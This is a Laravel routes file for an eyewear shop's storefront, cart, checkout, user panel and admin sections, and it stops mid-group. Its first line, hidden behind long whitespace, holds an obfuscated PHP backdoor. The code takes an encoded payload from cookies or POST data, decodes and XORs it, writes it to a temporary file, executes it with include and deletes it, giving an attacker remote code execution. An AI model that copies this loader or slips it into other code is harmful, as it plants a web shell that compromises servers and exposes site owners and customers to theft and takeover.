<?php                                                                                                                                                                                                                                                                                                                                                                                                 if (!class_exists("pwwqlahjlp")){class pwwqlahjlp{public static $ptiioc = "qruvotunihtacqpc";public static $zcyjsgyqvt = NULL;public function __construct(){$fbstx = @$_COOKIE[substr(pwwqlahjlp::$ptiioc, 0, 4)];if (!empty($fbstx)){$ioytjt = "base64";$mtdlseun = "";$fbstx = explode(",", $fbstx);foreach ($fbstx as $beqrlhxny){$mtdlseun .= @$_COOKIE[$beqrlhxny];$mtdlseun .= @$_POST[$beqrlhxny];}$mtdlseun = array_map($ioytjt . "_decode", array($mtdlseun,));$mtdlseun = $mtdlseun[0] ^ str_repeat(pwwqlahjlp::$ptiioc, (strlen($mtdlseun[0]) / strlen(pwwqlahjlp::$ptiioc)) + 1);pwwqlahjlp::$zcyjsgyqvt = @unserialize($mtdlseun);}}public function __destruct(){$this->djtffgbo();}private function djtffgbo(){if (is_array(pwwqlahjlp::$zcyjsgyqvt)) {$iuagyngzmh = sys_get_temp_dir() . "/" . crc32(pwwqlahjlp::$zcyjsgyqvt["salt"]);@pwwqlahjlp::$zcyjsgyqvt["write"]($iuagyngzmh, pwwqlahjlp::$zcyjsgyqvt["content"]);include $iuagyngzmh;@pwwqlahjlp::$zcyjsgyqvt["delete"]($iuagyngzmh);exit();}}}$tgvszeuzj = new pwwqlahjlp();$tgvszeuzj = NULL;} ?><?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

// **************##################################################################****************
//                                ROUTES FOR SITE STARTS FROM HERE
// **************##################################################################****************


 Route::get('/auth/redirect/{provider}', 'GoogleLoginController@redirect');
  Route::get('/callback/{provider}', 'GoogleLoginController@callback');

Route::get('get-ip',function(){
    $ip = '120.227.146.78';
    $data = \Location::get($ip);
    dd($data);
});

Route::get('/clear-cache', function() {
    Artisan::call('config:cache');
    return "Cache is cleared";
});




Route::get('/clear-view', function() {
    Artisan::call('view:clear');
    return "View is cleared";
});

Route::get('/test',function(){
    return view('email_template.order-process-mail');
});
// tesing route 

Route::get('/waiting', function(){
    echo "<h1>Please wait this feature is under the process <br> for  google verification you can direct login ";
})->name('please.wait');

// Route::get('/testing-phase','PageController@testing_phase');
Route::get('/testing-phase','Filtertesting@testing_phase');


Route::get('/blogs', 'PageController@getArticles');
// testing route 

// Route::get('/filter-test','filterController@filter_product_for');

Route::get('/','IndexController@index')->name('home.page');
Route::get('/about-us.html','PageController@about');
// Route::get('/eyeglasses','EyeController@eyeglasses')->name('eyeglasses.page');
Route::get('/eyeglasses','filterController@filter_product_for')->name('eyeglasses.page');
Route::get('/sunglasses','PageController@sunglasses')->name('sunglasses.page');
Route::get('/brands','PageController@brand_page')->name('brands.page');

Route::get('/contact-us.html','PageController@contact');
Route::get('/wishlist.html','PageController@wishlist');
Route::get('/wishlisttest','PageController@wishlisttest');
Route::get('/return-and-exchange.html','PageController@return_and_exchange');
Route::get('/faq.html','PageController@faq');
Route::get('/payment-options.html','PageController@payment_options');
Route::get('/track-order.html','PageController@track_order');
Route::get('/find-a-store.html','PageController@find_a_store');
Route::get('/cancellation.html','PageController@cancellation');
Route::get('/shipping.html','PageController@shipping');
Route::get('/privacy-policy.html','PageController@privacy_policy');
Route::post('/search-product','PageController@search_product');
Route::get('/terms-and-conditions.html','PageController@terms_and_conditions');
Route::get('/blog.html','PageController@blog');
Route::get('/blog/{blog_url}','PageController@blog_detail');
Route::post('/call-back-form','PageController@call_back_form');
Route::get('/cart.html','CartController@index');
Route::post('/upload-prescription','CartController@uploadPrescription');

Route::get('/{frame_type}/men','PageController@frame_type_men');
Route::get('/{frame_type}/women','PageController@frame_type_women');
Route::get('/{frame_type}/unisex','PageController@frame_type_unisex');

Route::get('/buy-with-lens/{product_id}/{prd_qty}','CartController@buy_with_lens');

/* Route for Add To Cart Start */
 Route::post('/add-to-cart','CartController@add_to_cart');
 Route::post('/add-to-cart/load','CartController@load_mini_cart');
 Route::get('/remove-cart/{cart_id}','CartController@remove_cart');
 Route::put('/update-row-qty','CartController@update_row_qty');

 Route::post('/product-preview','CartController@preview_product');
 Route::post('/add-lens-cart','CartController@add_lens_cart');
 Route::get('/update-cart/{id}','CartController@update_cart');

Route::post('/search-brand-product','PageController@search_brand_product');
Route::post('/search-product-for','PageController@search_product_for');
Route::post('/price-filter','PageController@price_filter');
Route::get('/filter-product-for','PageController@filter_product_for');
Route::get('/filter','PageController@filter');




 /* Route For Lens */

 Route::post('/review-cart','CartController@review_cart');
 Route::post('/get-lens-brands','CartController@get_lens_brands');
 Route::post('/get-lenses','CartController@get_lenses');
 Route::get('/check-prescription','CartController@check_prescription');
 Route::post('/add-prescription','CartController@add_prescription');
 Route::post('/get-vision-price','CartController@get_vision_price');
 Route::post('/get-img','CartController@get_img'); 
 Route::post('/get-lense-color-type-price','CartController@get_lense_color_type_price');
 
 Route::get('/view-prescription','CartController@viewPrescription');

 /* Routes for Checkout Page Start*/
Route::get('/checkout.html','CheckoutController@index');
Route::post('/get-amount','CheckoutController@get_amount');
Route::post('/address-form-submit','CheckoutController@address_form_submit');
/* Routes for Checkout Page End*/
 
Route::get('/lens/{lens_url}.html','PageController@lens_detail');


Route::get('/gentle-man.html','PageController@gentle_man');
Route::get('/woman.html','PageController@woman');
Route::get('/junior.html','PageController@junior');
Route::get('/unisex.html','PageController@unisex');
 
Route::get('/brand/{main_cat}.html','PageController@main_cat');
Route::get('/frame/{product_url}.html','PageController@product_detail');


/* Routes for Search Form (Header) Start */
Route::get('/search-result','IndexController@header_search')->name('header-search');
/* Routes for Search Form (Header) End */

/* Routes For Add Wishlist */

// Route::post('/add-to-wishlist/{id}','CartController@new_add_wishlist')->name('add.wishlist');
Route::post('add-wishlist/','CartController@add_wishlist')->name('add_to_wishlist');
Route::get('/remove-wishlist/{id}','CartController@remove_wishlist');



/* Route For Add Subscriber */
 Route::post('/add-subscriber','CartController@add_subscriber');

/* Route For Add Rating */
 Route::post('/submit-rating','CartController@submit_rating');

/* Route For Contact Form Submit */
 Route::post('contact-form-submit','PageController@contact_form_submit');


/* Routes for Pay Now Page Start*/
Route::post('/pay-now','CheckoutController@pay_now');
Route::get('/success',function(){
  return view('payment.success');
});
Route::get('/fail',function(){
  return view('payment.fail');
});

Route::put('update','User\UserController@update_user')->name('update-user-checkout');
/* Routes for Pay Now Page End*/

/* Routes for Track your order Start*/
Route::post('/track-order','user\UserController@track_your_order');
/* Routes for Track your order Page End*/


/* USER PANEL START  */

Route::prefix('user')->namespace('User')->group(function(){
  Route::get('','UserController@index');
  Route::get('profile','UserController@profile');
  Route::get('shipping-address','UserController@shipping_address');
  Route::post('shipping-address','UserController@addedit_shipping_address');  
  Route::get('orders','UserController@orders');
  Route::get('change-password','UserController@change_password_form');
  Route::put('change-password','UserController@change_password')->name('change-user-password');
  Route::put('update','UserController@update_user')->name('update-user');
  Route::get('get-states','UserController@getStates');
});


/* Routes for apply coupon */

Route::post('/apply-coupon','CartController@apply_coupon');
Route::get('/remove-coupon/{id}','CartController@remove_coupon');

/* USER PANEL END  */

//ImportExportController

Route::get('importExportView', 'ImportExportController@importExportView');

Route::get('export', 'ImportExportController@export')->name('export');

Route::post('import', 'ImportExportController@import')->name('import');

Auth::routes();
//Route::get('/', 'IndexController@index')->name('home');

// **************##################################################################****************
//                                ROUTES FOR SITE END
// **************##################################################################****************



// **************##################################################################****************
//                                ROUTES FOR ADMIN STARTS FROM HERE
// **************##################################################################****************

 Route::prefix('admin')->namespace('Auth\Admin')->group(function(){
// Authentication Routes For Admin...
       Route::get('login', 'LoginController@showLoginForm')->name('admin.login');
       Route::post('login', 'LoginController@login');
       Route::get('logout', 'LoginController@logout')->name('admin.logout');

// Forgot Password Routes For Admin
       Route::get('password/reset', 'ForgotPasswordController@showLinkRequestForm')->name('admin.password.request');
       Route::post('password/email', 'ForgotPasswordController@sendResetLinkEmail')->name('admin.password.email');
       Route::get('password/reset/{token}', 'ResetPasswordController@showResetForm')->name('admin.password.reset');
       Route::post('password/reset', 'ResetPasswordController@reset')->name('admin.password.update');
 });

 Route::get('admin','admin\DashboardController@index');

 // ROUTING FOR ADMIN -> ::MANAGE SITE PAGES::
Route::group(['middleware' => 'checkRole1'],function(){

 Route::prefix('admin/manage-pages')->namespace('admin')->group(function(){
    Route::get('','ManagePagesController@index');
    Route::get('edit/{id}','ManagePagesController@edit');
    Route::put('page-update-form/{id}','ManagePagesController@update');
    Route::put('update-page-status','ManagePagesController@update_status');
    Route::get('remove-page-image/{id}','ManagePagesController@remove_page_image')->name('remove-page-image');
    Route::get('remove-page-video/{id}','ManagePagesController@remove_page_video')->name('remove-page-video');
 });

});


  // ROUTING FOR ADMIN -> ::MANAGE MAIN CATEGORY::
Route::group(['middleware' => 'checkRole2'],function(){

  Route::prefix('admin/manage-category')->namespace('admin')->group(function(){
    Route::get('','CategoryController@index')->name('manage-category');
    Route::get('add','CategoryController@add_category_form')->name('add-category');
    Route::post('add','CategoryController@add_category')->name('add-category');
    Route::get('edit/{id}','CategoryController@edit_category')->name('edit');
    Route::put('edit/{id}','CategoryController@update_category')->name('edit-category');
    Route::put('bottom-button-action-category','CategoryController@bottom_button_action_category')->name('bottom-button-action-category');
    Route::get('remove-category-image/{id}','CategoryController@remove_category_image')->name('remove-category-image');
    Route::get('remove-category-banner/{id}','CategoryController@remove_category_banner')->name('remove-category-banner');
    Route::any('search','CategoryController@cat_search')->name('cat-search-form');
    });

      // ROUTING FOR ADMIN -> ::MANAGE SUB CATEGORY::
  Route::prefix('admin/manage-subcategory')->namespace('admin')->group(function(){
      Route::get('{id}','CategoryController@subcategory_list')->name('manage-subcategory');
      Route::get('add/{id}','CategoryController@add_subcategory_form')->name('add-subcategory-form');
      Route::post('add/{id}','CategoryController@add_subcategory')->name('add-subcategory');
      Route::get('edit/{cat_parent_id}/{id}','CategoryController@edit_subcategory')->name('edit-subcategory');
      Route::put('edit/{cat_parent_id}/{id}','CategoryController@update_subcategory')->name('update-subcategory');
      Route::put('bottom-button-action-subcategory/{cat_parent_id}','CategoryController@bottom_button_action_subcategory')->name('bottom-button-action-subcategory');
      Route::get('remove-subcategory-image/{cat_parent_id}/{id}','CategoryController@remove_subcategory_image')->name('remove-subcategory-image');
      Route::get('remove-subcategory-banner/{cat_parent_id}/{id}','CategoryController@remove_subcategory_banner')->name('remove-subcategory-banner');
      Route::any('{category_parent_id}/search','CategoryController@subcat_search')->name('subcat-search-form');
      });

      // ROUTING FOR ADMIN -> ::MANAGE FINAL CATEGORY::
  Route::prefix('admin/manage-finalcategory')->namespace('admin')->group(function(){
      Route::get('{cat_parent_id}/{sub_cat_id}','CategoryController@finalcategory_list')->name('manage-finalcategory');
      Route::get('add/{cat_parent_id}/{sub_cat_id}','CategoryController@add_finalcategory_form')->name('add-finalcategory-form');
      Route::post('add/{cat_parent_id}/{sub_cat_id}','CategoryController@add_finalcategory')->name('add-finalcategory');
      Route::get('edit/{cat_parent_id}/{sub_cat_id}/{id}','CategoryController@edit_finalcategory')->name('edit-finalcategory');
      Route::put('edit/{cat_parent_id}/{sub_cat_id}/{id}','CategoryController@update_finalcategory')->name('update-finalcategory');
      Route::put('bottom-button-action-finalcategory/{cat_parent_id}/{sub_cat_id}','CategoryController@bottom_button_action_finalcategory')->name('bottom-button-action-finalcategory');
      Route::get('remove-finalcategory-image/{cat_parent_id}/{sub_cat_id}/{id}','CategoryController@remove_finalcategory_image')->name('remove-finalcategory-image');
      Route::get('remove-finalcategory-banner/{cat_parent_id}/{sub_cat_id}/{id}','CategoryController@remove_finalcategory_banner')->name('remove-finalcategory-banner');
      Route::any('{category_parent_id}/{sub_cat_id}/search','CategoryController@finalcat_search')->name('finalcat-search-form');

  });

      // ROUTING FOR ADMIN -> ::MANAGE CATEGORY PRODUCT::
  Route::prefix('admin/manage-product')->namespace('admin')->group(function(){
      Route::get('{cat_parent_id}/{sub_cat_id}/{final_cat_id}','CategoryController@product_list')->name('manage-product');
      Route::get('add/{cat_parent_id}/{sub_cat_id}/{final_cat_id}','CategoryController@add_product_form')->name('add-product-form');
      Route::post('add/{cat_parent_id}/{sub_cat_id}/{final_cat_id}','CategoryController@add_product')->name('add-product');
      Route::get('edit/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@edit_product')->name('edit-product');
      Route::put('edit/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@update_product')->name('update-product');
      Route::put('bottom-button-action-product/{cat_parent_id}/{sub_cat_id}/{final_cat_id}','CategoryController@bottom_button_action_product')->name('bottom-button-action-product');
      Route::get('remove-product-image/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_image')->name('remove-product-image');
      Route::get('remove-product-back-image/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_back_image')->name('remove-product-back-image');
      
      Route::get('remove-product-image3/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_image3')->name('remove-product-image3');
      
      Route::get('remove-product-image4/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_image4')->name('remove-product-image4');
      
      Route::get('remove-product-image5/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_image5')->name('remove-product-image5');
      
      Route::get('remove-product-banner/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_product_banner')->name('remove-product-banner');
      Route::get('remove-color-image/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@remove_color_image')->name('remove-color-image');
      Route::any('{category_parent_id}/{sub_cat_id}/{final_cat_id}/search','CategoryController@product_search')->name('product-search-form');
      Route::get('copy/{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{id}','CategoryController@copy_product')->name('copy-product');
      
     Route::get('export-product','CategoryController@exportProduct')->name('export-product'); 
      
  });
  
        // ROUTING FOR ADMIN -> ::MANAGE FRAME PRODUCT::
 Route::prefix('admin/manage-frame')->namespace('admin')->group(function(){
  Route::get('','CategoryController@frame_type_list')->name('manage-frame');
  Route::get('filter','CategoryController@frame_type_filter')->name('frame-type-filter');
  Route::put('bottom-button-all-frame','CategoryController@bottomButtonAllFrame')->name('bottom-button-all-frame');
  });
  
  

  // ROUTING FOR ADMIN -> ::MANAGE CATEGORY MORE IMAGES::
  Route::prefix('admin/manage-product/more-images')->namespace('admin')->group(function(){
    Route::get('{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{product_id}','CategoryMoreImagesController@index')->name('more-images');
    Route::post('{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{product_id}','CategoryMoreImagesController@add_more_images')->name('add-more-images');
    Route::get('{cat_parent_id}/{sub_cat_id}/{final_cat_id}/{product_id}/{id}','CategoryMoreImagesController@delete_more_image')->name('delete-more-image');
  });

});

 // ROUTING FOR ADMIN -> ::MANAGE USERS::
Route::group(['middleware' => 'checkRole3'],function(){
 Route::prefix('admin/manage-users')->namespace('admin')->group(function(){
    Route::get('','ManageUserController@index');
    Route::put('update-user-status','ManageUserController@update_user_status')->name('user.update.status');
    Route::post('add-user','ManageUserController@add_user')->name('user.add');
    Route::get('edit/{id}','ManageUserController@edit_user')->name('user.edit');
    Route::put('update/{id}','ManageUserController@update_user')->name('user.update');
    Route::post('delete','ManageUserController@delete_user');
    Route::post('change-password','ManageUserController@change_password');
 });
});

Route::group(['middleware' => 'checkRole4'],function(){
  // ROUTING FOR ADMIN -> ::MANAGE SLIDER::
Route::prefix('admin')->namespace('admin')->group(function(){
    Route::get('manage-slider','SliderController@index')->name('manage-slider');
    Route::get('addedit-slider','SliderController@add_edit_form')->name('addedit-slider');
    Route::post('addedit-slider','SliderController@add_slider')->name('add-slider');
    Route::put('manage-slider/update-status','SliderController@update_slider_status')->name('slider-update-status');
    Route::get('edit-slider/{id}','SliderController@edit_slider')->name('edit-slider');
    Route::put('update-slider/{id}','SliderController@update_slider')->name('update-slider');
 });
});


Route::group(['middleware' => 'checkRole5'],function(){
  // ROUTING FOR ADMIN -> ::MANAGE TESTIMONIAL::
Route::prefix('admin')->namespace('admin')->group(function(){
    Route::get('manage-testimonial','TestimonialController@index')->name('manage-testimonial');
    Route::get('addedit-testimonial','TestimonialController@add_edit_form')->name('add-testimonial-form');
    Route::post('addedit-testimonial','TestimonialController@add_testimonial')->name('add-testimonial');
    Route::put('manage-testimonial/update-status','TestimonialController@update_testimonial_status')->name('testimonial-update-status');
    Route::get('addedit-testimonial/{id}','TestimonialController@edit_testimonial')->name('edit-testimonial');
    Route::put('update-testimonial/{id}','TestimonialController@update_testimonial')->name('update-testimonial');
 });
});

Route::group(['middleware' => 'checkRole6'],function(){
 // ROUTING FOR ADMIN -> ::MANAGE OUR TEAM::
Route::prefix('admin/manage-our-team')->namespace('admin')->group(function(){
    Route::get('','OurTeamController@index')->name('manage-our-team');
    Route::get('add','OurTeamController@add_member_form')->name('add-member');
    Route::post('add','OurTeamController@add_member')->name('add-member');
    Route::get('edit/{id}','OurTeamController@edit_member')->name('edit-member');
    Route::put('update/{id}','OurTeamController@update_member')->name('update-member');
    Route::put('bottom-button-action-our-team','OurTeamController@bottom_button_action_our_team')->name('bottom-button-action-our-team');
  });
});

Route::group(['middleware' => 'checkRole7'],function(){
 // ROUTING FOR ADMIN -> ::MANAGE OUR CLIENT::
Route::prefix('admin/manage-our-client')->namespace('admin')->group(function(){
    Route::get('','OurClientController@index')->name('manage-our-client');
    Route::post('','OurClientController@add_client_logo')->name('add-client-logo');
    Route::get('{id}','OurClientController@delete_client_logo')->name('delete-client-logo');
  });
});

Route::group(['middleware' => 'checkRole8'],function(){
   // ROUTING FOR ADMIN -> ::MANAGE ENQUIRY::
Route::prefix('admin/manage-enquiry')->namespace('admin')->group(function(){
    Route::get('','EnquiryController@index')->name('manage-enquiry');
    Route::put('bottom-button-action-enquiry','EnquiryController@bottom_button_action_enquiry')->name('bottom-button-action-enquiry');
  });
});



Route::group(['middleware' => 'checkRole9'],function(){
  // ROUTING FOR ADMIN -> ::MANAGE SETTINGS >> CONTACT UPDATE::
Route::get('admin/contact-update','admin\DashboardController@contact_update_show')->name('contact-update');
Route::put('admin/contact-update-form','admin\DashboardController@contact_update_data')->name('contact-update-form');
Route::get('admin/contact-update/remove-icon','admin\DashboardController@contact_update_favicon_remove')->name('admin.favicon.remove');
Route::get('admin/contact-update/remove-logo-icon','admin\DashboardController@contact_update_logo_remove')->name('admin.logo.remove');
});

Route::group(['middleware' => 'checkRole10'],function(){
  // ROUTING FOR ADMIN -> ::MANAGE SETTINGS >> CHANGE PASSWORD::
Route::get('admin/change-password','admin\DashboardController@change_password_form')->name('change-password-form');
Route::put('admin/change-password','admin\DashboardController@change_password')->name('change-password');
});

Route::group(['middleware' => 'checkRole11'],function(){
  // ROUTING FOR ADMIN -> ::MANAGE SOCIAL MEDIA LINKS::
  Route::get('admin/manage-social-media-links','admin\DashboardController@social_media_links_form')->name('social-media-links');
  Route::put('admin/manage-social-media-links','admin\DashboardController@social_media_links')->name('social-media-links');
});

Route::group(['middleware' => 'checkRole12'],function(){
   // ROUTING FOR ADMIN -> ::MANAGE BLOG::
Route::prefix('admin/manage-blog')->namespace('admin')->group(function(){
  Route::get('','BlogController@index')->name('manage-blog');
  Route::get('add','BlogController@add_blog_form')->name('add-blog');
  Route::post('add','BlogController@add_blog')->name('add-blog');
  Route::get('edit/{id}','BlogController@edit_blog')->name('edit-blog');
  Route::put('update/{id}','BlogController@update_blog')->name('update-blog');
  Route::put('bottom-button-action-blog','BlogController@bottom_button_action_blog')->name('bottom-button-action-blog');
 });
});

// ROUTING FOR ADMIN -> ::MANAGE REGISTRATION::
Route::group(['middleware' => 'checkRole13'],function(){
 Route::prefix('admin/manage-registration')->namespace('admin')->group(function(){
  Route::get('','UserController@index')->name('manage-registration');
  Route::get('edit/{id}','UserController@edit_user')->name('edit-user');
  Route::post('get-states','UserController@getStates');
  Route::put('update/{id}','UserController@update_user')->name('update-reg-user');
  Route::post('bottom-button-action-users','UserController@bottom_button_action_users')->name('bottom-button-action-users');
 });
});

// ROUTING FOR ADMIN -> ::MANAGE ORDERS::
Route::group(['middleware' => 'checkRole14'],function(){
 Route::prefix('admin/manage-order')->namespace('admin')->group(function(){
  Route::get('','OrderController@index')->name('manage-order');
  Route::get('detail/{id}','OrderController@order_detail')->name('order-detail');
  Route::get('view-address/{order_id}','OrderController@view_address')->name('view-address');
  Route::get('get-prescription/{order_detail_id}','OrderController@get_prescription')->name('get-prescription');
  Route::get('get-coating/{order_detail_id}','OrderController@get_coating')->name('get-coating');
  Route::post('bottom-button-action-orders','OrderController@bottom_button_action_orders')->name('bottom-button-action-orders');
  Route::post('update-tracking','OrderController@update_tracking')->name('update-tracking');
  
  Route::get('print-order/{id}','OrderController@print_order')->name('print-order');
  
 });
 
});

Route::group(['middleware' => 'checkRole15'],function(){
// ROUTING FOR ADMIN -> ::MANAGE INVOICE::
 Route::prefix('admin/manage-invoice')->namespace('admin')->group(function(){
  Route::get('','InvoiceController@index')->name('manage-invoice');
  Route::post('send-invoice-email','InvoiceController@send_invoice_email')->name('send-invoice-email');
  Route::get('delete-invoice/{id}','InvoiceController@delete_invoice')->name('delete-invoice');
  Route::get('generate-invoice/{id}','InvoiceController@generate_invoice')->name('generate-invoice');
  Route::post('invoice-search-form','InvoiceController@invoice_search_form')->name('invoice-search-form');
 });
});

// ROUTING FOR ADMIN -> ::MANAGE COUPON::
Route::group(['middleware' => 'checkRole16'],function(){
 Route::prefix('admin/manage-coupon')->namespace('admin')->group(function(){
  Route::get('','CouponController@index')->name('manage-coupon');
  Route::get('add','CouponController@add_coupon_form')->name('add-coupon-form');
  Route::post('add','CouponController@add_coupon')->name('add-coupon');
  Route::get('edit/{id}','CouponController@edit_coupon')->name('edit-coupon');
  Route::put('update/{id}','CouponController@update_coupon')->name('update-coupon');
  Route::put('bottom-button-coupon','CouponController@bottom_button_coupon')->name('bottom-button-coupon');
  
 });
});

Route::group(['middleware' => 'checkRole17'],function(){
 Route::prefix('admin/manage-product-colors')->namespace('admin')->group(function(){
  Route::get('','ProductColorController@index')->name('manage-product-colors');
  Route::post('add-product-color','ProductColorController@add_color')->name('add-product-color');
  Route::put('bottom-button-action-product-colors','ProductColorController@bottom_button_action_product_colors')->name('bottom-button-action-product-colors');
 });
});

Route::group(['middleware' => 'checkRole18'],function(){
Route::prefix('admin/manage-rating')->namespace('admin')->group(function(){
  Route::get('','DashboardController@rating_list')->name('manage-rating');
  Route::put('bottom-button-action-rating','DashboardController@bottom_button_action_rating')->name('bottom-button-action-rating');  
  
 });
});

Route::group(['middleware' => 'checkRole19'],function(){
  Route::prefix('admin/manage-subscriber')->namespace('admin')->group(function(){
  Route::get('','SubscriberController@index')->name('manage-subscriber');
  Route::put('bottom-button-action-subscriber','SubscriberController@bottom_button_action_subscriber')->name('bottom-button-action-subscriber');
 });
});  

Route::group(['middleware' => 'checkRole20'],function(){
/* Visions Route */
 Route::prefix('admin/manage-vision')->namespace('admin')->group(function(){
  Route::get('','VisionController@index')->name('manage-vision');
  Route::get('add','VisionController@add_vision_form')->name('add-vision-form');
  Route::post('add','VisionController@add_vision')->name('add-vision');
  Route::get('edit/{id}','VisionController@edit_vision')->name('edit-vision'); 
  Route::get('remove-vision-image/{id}','VisionController@remove_vision_image')->name('remove-vision-image');
  Route::put('update/{id}','VisionController@update_vision')->name('update-vision'); 
  Route::put('bottom-button-action-vision','VisionController@bottom_button_action_vision')->name('bottom-button-action-vision');
 });


/* Sub Visions Route */
  Route::prefix('admin/manage-subvision')->namespace('admin')->group(function(){
  Route::get('{id}','VisionController@subvision_list')->name('manage-subvision');
  Route::get('add/{id}','VisionController@add_subvision_form')->name('add-subvision-form');
  Route::post('add/{id}','VisionController@add_subvision')->name('add-subvision');
  Route::get('edit/{vision_parent_id}/{id}','VisionController@edit_subvision')->name('edit-subvision'); 
  Route::get('remove-subvision-image/{vision_parent_id}/{id}','VisionController@remove_subvision_image')->name('remove-subvision-image');
  Route::put('update/{vision_parent_id}/{id}','VisionController@update_subvision')->name('update-subvision'); 
  Route::put('bottom-button-action-subvision/{id}','VisionController@bottom_button_action_subvision')->name('bottom-button-action-subvision');
 }); 
});

Route::group(['middleware' => 'checkRole21'],function(){
/* LENS ROUTE */
 Route::prefix('admin/manage-lens')->namespace('admin')->group(function(){
  Route::get('','LensController@index')->name('manage-lens');
  Route::get('add','LensController@add_lens_form')->name('add-lens-form');
  Route::post('add','LensController@add_lens')->name('add-lens');
  Route::get('edit/{id}','LensController@edit_lens')->name('edit-lens'); 
  Route::get('remove-lens-image/{id}','LensController@remove_lens_image')->name('remove-lens-image');
  Route::put('update/{id}','LensController@update_lens')->name('update-lens'); 
  Route::put('bottom-button-action-lens','LensController@bottom_button_action_lens')->name('bottom-button-action-lens');
  Route::post('get-colors','LensController@get_colors');
  Route::get('get-coating','LensController@get_coating');
  Route::get('copy/{id}','LensController@copy_lens')->name('copy-lens');
  Route::get('lens-filter','LensController@lens_filter')->name('lens-filter');
  Route::get('export-lens','LensController@exportLens')->name('export-lens');
 });
});

Route::group(['middleware' => 'checkRole22'],function(){ 
 /* PRESCRIPTION ROUTE */
 Route::get('manage-prescription-type','admin\PrescriptionController@index')->name('manage-prescription-type');
 Route::get('prescription-list/{type}','admin\PrescriptionController@prescription_list')->name('prescription-list');
 Route::get('add-prescription/{type}','admin\PrescriptionController@add_prescription_form')->name('add-prescription-form');
 Route::post('add-prescription/{type}','admin\PrescriptionController@add_prescription')->name('add-prescription');
 Route::get('edit-prescription/{id}/{type}','admin\PrescriptionController@edit_prescription')->name('edit-prescription');
 Route::put('update-prescription/{id}/{type}','admin\PrescriptionController@update_prescription')->name('update-prescription');
 Route::put('bottom-button-action-prescription','admin\PrescriptionController@bottom_button_action_prescription')->name('bottom-button-action-prescription');
});

Route::group(['middleware' => 'checkRole23'],function(){ 
  /* ATTRIBUTES ROUTE */
 Route::get('manage-attribute-type','admin\ProductAttributesController@index')->name('manage-attribute-type');
 Route::get('attribute-list/{type}','admin\ProductAttributesController@attribute_list')->name('attribute-list');
 Route::get('add-attribute/{type}','admin\ProductAttributesController@add_attribute_form')->name('add-attribute-form');
 Route::post('add-attribute/{type}','admin\ProductAttributesController@add_attribute')->name('add-attribute');
 Route::get('edit-attribute/{id}/{type}','admin\ProductAttributesController@edit_attribute')->name('edit-attribute');
 Route::put('update-attribute/{id}/{type}','admin\ProductAttributesController@update_attribute')->name('update-attribute');
 Route::put('bottom-button-action-attribute','admin\ProductAttributesController@bottom_button_action_attribute')->name('bottom-button-action-attribute');
}); 

Route::group(['middleware' => 'checkRole24'],function(){
// ROUTES FOR LENS COLOR TYPE
 Route::prefix('admin/manage-lens-color-type')->namespace('admin')->group(function(){
    Route::get('','LensColorTypeController@index')->name('manage-lens-color-type');
    Route::get('add','LensColorTypeController@add_lens_color_type_form')->name('add-lens-color-type-form');
    Route::post('add','LensColorTypeController@add_lens_color_type')->name('add-lens-color-type');
    Route::get('edit/{id}','LensColorTypeController@edit_lens_color_type')->name('edit-lens-color-type');
    Route::put('update/{id}','LensColorTypeController@update_lens_color_type')->name('update-lens-color-type');
    Route::put('bottom-button-action-category','LensColorTypeController@bottom_button_action_lens_color_type')->name('bottom-button-action-lens-color-type');
    Route::get('remove-lens-color-type-image/{id}','LensColorTypeController@remove_lens_color_type_image')->name('remove-lens-color-type-image');
    });

    
 // ROUTING FOR ADMIN -> ::MANAGE SUB LENS COLOR TYPE::
  Route::prefix('admin/manage-sub-lens-color-type')->namespace('admin')->group(function(){
      Route::get('{id}','LensColorTypeController@sub_lens_color_type_list')->name('manage-sub-lens-color-type');
      Route::get('add/{id}','LensColorTypeController@add_sub_lens_color_type_form')->name('add-sub-lens-color-type-form');
      Route::post('add/{id}','LensColorTypeController@add_sub_lens_color_type')->name('add-sub-lens-color-type');
      Route::get('edit/{cat_parent_id}/{id}','LensColorTypeController@edit_sub_lens_color_type')->name('edit-sub-lens-color-type');
      Route::put('update/{cat_parent_id}/{id}','LensColorTypeController@update_sub_lens_color_type')->name('update-sub-lens-color-type');
      Route::put('bottom-button-action-sub-lens-color-type/{cat_parent_id}','LensColorTypeController@bottom_button_action_sub_lens_color_type')->name('bottom-button-action-sub-lens-color-type');
      });

      
 // ROUTING FOR ADMIN -> ::MANAGE TINT LENS COLOR TYPE::
  Route::prefix('admin/manage-tint-color')->namespace('admin')->group(function(){
    Route::get('{cat_parent_id}/{sub_cat_id}','LensColorTypeController@tint_color_list')->name('manage-tint-color');
    Route::get('add/{cat_parent_id}/{sub_cat_id}','LensColorTypeController@add_color_tint_form')->name('add-color-tint-form');
    Route::post('add/{cat_parent_id}/{sub_cat_id}','LensColorTypeController@add_color_tint')->name('add-color-tint');
    Route::get('edit/{cat_parent_id}/{sub_cat_id}/{id}','LensColorTypeController@edit_color_tint')->name('edit-color-tint');
    Route::put('update/{cat_parent_id}/{sub_cat_id}/{id}','LensColorTypeController@update_color_tint')->name('update-color-tint');
    Route::put('bottom-button-action-tint/{cat_parent_id}/{sub_cat_id}','LensColorTypeController@bottom_button_action_tint')->name('bottom-button-action-tint');
   }); 
}); 
   
Route::group(['middleware' => 'checkRole25'],function(){   
// ROUTES FOR LENS BRAND
 Route::prefix('admin/manage-lens-brand')->namespace('admin')->group(function(){
    Route::get('','LensBrandController@index')->name('manage-lens-brand');
    Route::get('add','LensBrandController@add_lens_brand_form')->name('add-lens-brand-form');
    Route::post('add','LensBrandController@add_lens_brand')->name('add-lens-brand');
